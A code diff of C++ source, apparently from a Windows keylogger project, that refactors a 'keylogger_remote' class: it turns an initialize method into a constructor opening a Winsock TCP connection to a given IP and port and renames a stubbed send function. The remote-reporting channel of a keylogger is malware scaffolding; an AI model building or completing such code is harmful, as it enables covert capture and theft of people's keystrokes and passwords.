@@ -1,19 +1,9 @@
 #include "./keylogger_remote.hpp"
 
-keylogger_remote::keylogger_remote()
+keylogger_remote::keylogger_remote(string p_ipd_address, int p_port)
 {
 	a_socket = 0;
-}
 
-keylogger_remote::~keylogger_remote()
-{
-	closesocket(a_socket);
-
-	WSACleanup();
-}
-
-void keylogger_remote::initialize(string p_ip_address, int p_port)
-{
 	WSADATA t_wsa_data;
 
 	int t_result = 0;
@@ -29,9 +19,9 @@ void keylogger_remote::initialize(string p_ip_address, int p_port)
 	}
 
 	SOCKADDR_IN t_sockaddr_in;
-	t_sockaddr_in.sin_addr.s_addr = inet_addr(p_ip_address.c_str()); //inet_addr(p_ip_address);
+	t_sockaddr_in.sin_addr.s_addr = inet_addr(p_ipd_address.c_str()); //inet_addr(p_ip_address);
 	t_sockaddr_in.sin_family      = AF_INET;
-	t_sockaddr_in.sin_port		  = htons(p_port);
+	t_sockaddr_in.sin_port		    = htons(p_port);
 
 	a_socket = socket(AF_INET,SOCK_STREAM,0);
 
@@ -56,7 +46,17 @@ void keylogger_remote::initialize(string p_ip_address, int p_port)
 	}
 }
 
-void keylogger_remote::save()
+keylogger_remote::~keylogger_remote()
+{
+	closesocket(a_socket);
+
+	WSACleanup();
+}
+
+/*
+* TODO
+*/
+void keylogger_remote::store()
 {
 	cout << "Send" << endl;
 
